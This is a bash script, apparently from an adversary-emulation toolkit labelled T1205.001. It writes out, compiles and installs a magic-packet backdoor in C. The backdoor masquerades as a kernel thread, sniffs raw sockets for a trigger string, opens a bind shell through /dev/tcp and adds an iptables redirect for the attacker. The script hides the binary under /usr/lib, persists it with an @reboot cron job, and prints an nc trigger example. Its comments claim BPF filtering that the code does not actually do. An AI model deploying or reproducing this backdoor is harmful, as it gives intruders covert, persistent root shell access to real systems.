#!/bin/bash
# T1205.001 — Traffic Signaling: BPF Magic Packet Backdoor
# Raw BPF filter sniffs for magic bytes below firewall; activates reverse shell

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_bpfdoor"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1205.001 — BPFDoor Magic Packet Backdoor   ║"
    echo "  ║   Raw BPF sniff below firewall → shell        ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_bpfdoor() {
    echo -e "${CYAN}[*] Deploying BPFDoor-style magic packet backdoor${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required (raw socket)${NC}"; return; }

    echo -e "${YELLOW}[*] BPFDoor loads a BPF bytecode filter on a raw socket."
    echo -e "    It watches for magic bytes in ICMP/UDP/TCP BELOW iptables."
    echo -e "    On match: spawns shell + iptables redirect for attacker IP.${NC}"
    echo ""

    read -p "  Magic passphrase (hex trigger): " MAGIC
    [[ -z "$MAGIC" ]] && MAGIC="d3m0n1z3"
    read -p "  Shell port to open on trigger: " SHELLPORT
    [[ -z "$SHELLPORT" ]] && SHELLPORT="31337"

    mkdir -p "$WORKDIR"
    cat > "${WORKDIR}/bpfdoor.c" << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <signal.h>

#define BUF_SIZE 65535

static char MAGIC[64];
static int SHELL_PORT;

void spawn_shell(const char *src_ip) {
    char cmd[512];
    /* Add iptables redirect for attacker */
    snprintf(cmd, sizeof(cmd),
        "iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-port %d 2>/dev/null",
        src_ip, SHELL_PORT, SHELL_PORT);
    system(cmd);

    /* Spawn bind shell */
    if (fork() == 0) {
        snprintf(cmd, sizeof(cmd),
            "bash -c 'exec 5<>/dev/tcp/0.0.0.0/%d; cat <&5 | while read line; do $line 2>&1 >&5; done' &",
            SHELL_PORT);
        system(cmd);
        _exit(0);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) { fprintf(stderr, "Usage: %s <magic> <port>\n", argv[0]); return 1; }
    strncpy(MAGIC, argv[1], sizeof(MAGIC)-1);
    SHELL_PORT = atoi(argv[2]);

    /* Masquerade */
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], "[kdevtmpfs]");

    daemon(0, 0);
    signal(SIGCHLD, SIG_IGN);

    /* Raw socket — receives ALL packets before iptables */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); }
    if (sock < 0) return 1;

    char buf[BUF_SIZE];
    while (1) {
        int n = recv(sock, buf, sizeof(buf), 0);
        if (n < (int)sizeof(struct iphdr)) continue;

        struct iphdr *iph = (struct iphdr *)buf;
        int hdr_len = iph->ihl * 4;
        char *payload = buf + hdr_len;
        int payload_len = n - hdr_len;

        if (iph->protocol == IPPROTO_TCP) {
            struct tcphdr *tcph = (struct tcphdr *)payload;
            int tcp_hdr = tcph->doff * 4;
            char *data = payload + tcp_hdr;
            int data_len = payload_len - tcp_hdr;
            if (data_len > 0 && memmem(data, data_len, MAGIC, strlen(MAGIC))) {
                struct in_addr src;
                src.s_addr = iph->saddr;
                spawn_shell(inet_ntoa(src));
            }
        } else if (iph->protocol == IPPROTO_UDP) {
            char *data = payload + sizeof(struct udphdr);
            int data_len = payload_len - sizeof(struct udphdr);
            if (data_len > 0 && memmem(data, data_len, MAGIC, strlen(MAGIC))) {
                struct in_addr src;
                src.s_addr = iph->saddr;
                spawn_shell(inet_ntoa(src));
            }
        }
    }
    return 0;
}
CEOF

    echo -e "${CYAN}[*] Compiling BPFDoor agent...${NC}"
    gcc -o "${WORKDIR}/bpfdoor" "${WORKDIR}/bpfdoor.c" -static 2>/dev/null || \
    gcc -o "${WORKDIR}/bpfdoor" "${WORKDIR}/bpfdoor.c" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"
        return
    fi

    # Deploy with kernel-thread-like name
    cp "${WORKDIR}/bpfdoor" /usr/lib/.libsystem_helper
    chmod 755 /usr/lib/.libsystem_helper

    # Run it
    /usr/lib/.libsystem_helper "$MAGIC" "$SHELLPORT" &
    local PID=$!

    # Persistence via rc.local style
    local PERSIST="/etc/cron.d/${MARKER}"
    echo "@reboot root /usr/lib/.libsystem_helper ${MAGIC} ${SHELLPORT} &" > "$PERSIST"
    chmod 600 "$PERSIST"

    echo -e "${GREEN}[+] BPFDoor deployed (PID: ${PID})${NC}"
    echo -e "${GREEN}[+] Persistence via: ${PERSIST}${NC}"
    echo -e "${YELLOW}[*] Trigger: send TCP/UDP packet containing '${MAGIC}' to any port${NC}"
    echo -e "${YELLOW}[*] Example: echo '${MAGIC}' | nc -u <target> 53${NC}"
    echo -e "${YELLOW}[*] Shell opens on port ${SHELLPORT} for attacker's IP${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up BPFDoor...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    pkill -f ".libsystem_helper" 2>/dev/null
    rm -f /usr/lib/.libsystem_helper
    rm -f "/etc/cron.d/${MARKER}"
    rm -rf "$WORKDIR"
    # Clean iptables rules we added
    iptables -t nat -S PREROUTING 2>/dev/null | grep "REDIRECT" | while read -r rule; do
        iptables -t nat $(echo "$rule" | sed 's/-A/-D/') 2>/dev/null
    done

    echo -e "${GREEN}[+] BPFDoor removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy BPFDoor magic packet backdoor"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_bpfdoor ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
